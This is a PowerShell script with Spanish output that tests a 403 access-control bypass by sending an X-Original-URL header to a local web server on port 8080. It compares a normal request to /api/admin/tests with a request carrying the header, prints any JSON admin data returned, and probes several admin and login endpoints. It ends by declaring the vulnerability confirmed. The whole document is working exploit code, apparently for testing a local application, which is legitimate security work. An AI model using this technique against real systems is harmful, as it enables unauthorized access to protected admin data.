Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "PRUEBA INTERACTIVA: Bypass 403 - Ver Datos Reales" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

# Test directo primero
Write-Host "TEST RAPIDO: Probando bypass con X-Original-URL" -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Gray
Write-Host ""

# Test 1: Sin bypass
Write-Host "1. Acceso normal a /api/admin/tests:" -ForegroundColor Cyan
try {
    $r1 = Invoke-WebRequest -Uri "http://localhost:8080/api/admin/tests" -UseBasicParsing
    Write-Host "   Status: $($r1.StatusCode) - Content-Type: $($r1.Headers.'Content-Type')" -ForegroundColor Green
} catch {
    Write-Host "   Status: $($_.Exception.Response.StatusCode.value__) - BLOQUEADO (esperado)" -ForegroundColor Red
}
Write-Host ""

# Test 2: Con bypass
Write-Host "2. BYPASS usando X-Original-URL header:" -ForegroundColor Cyan
try {
    $headers = @{"X-Original-URL" = "/api/admin/tests"}
    $r2 = Invoke-WebRequest -Uri "http://localhost:8080/" -Headers $headers -UseBasicParsing
    $ct = $r2.Headers.'Content-Type'
    Write-Host "   Status: $($r2.StatusCode) - Content-Type: $ct" -ForegroundColor Green
    
    if ($ct -like "*json*") {
        Write-Host "   EXITO! Recibimos JSON (datos de API)" -ForegroundColor Green
        Write-Host "   Contenido:" -ForegroundColor Yellow
        $r2.Content | Write-Host -ForegroundColor White
    } else {
        Write-Host "   Recibimos HTML (frontend)" -ForegroundColor Yellow
    }
} catch {
    Write-Host "   Status: $($_.Exception.Response.StatusCode.value__) - Fallo" -ForegroundColor Red
}
Write-Host ""
Write-Host "================================================================" -ForegroundColor Gray
Write-Host ""

# Test 3: Probar multiples endpoints
Write-Host "PROBANDO MULTIPLES ENDPOINTS:" -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Gray
Write-Host ""

$endpoints = @(
    "/api/tests",
    "/api/admin",
    "/api/admin/tests",
    "/api/auth/login"
)

foreach ($ep in $endpoints) {
    Write-Host "Probando: $ep" -ForegroundColor White
    try {
        $h = @{"X-Original-URL" = $ep}
        $r = Invoke-WebRequest -Uri "http://localhost:8080/" -Headers $h -UseBasicParsing -TimeoutSec 3
        $ct = $r.Headers.'Content-Type'
        
        if ($ct -like "*json*") {
            Write-Host "  OK $($r.StatusCode) - JSON" -ForegroundColor Green
        } else {
            Write-Host "  OK $($r.StatusCode) - HTML" -ForegroundColor Gray
        }
    } catch {
        $s = $_.Exception.Response.StatusCode.value__
        if ($s) {
            Write-Host "  BLOQUEADO $s" -ForegroundColor Red
        } else {
            Write-Host "  ERROR" -ForegroundColor DarkGray
        }
    }
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "CONCLUSION:" -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "Si el Test 2 funciono y el Test 1 fallo," -ForegroundColor White
Write-Host "entonces la vulnerabilidad esta confirmada!" -ForegroundColor White
Write-Host ""

Read-Host "Presiona Enter para salir"
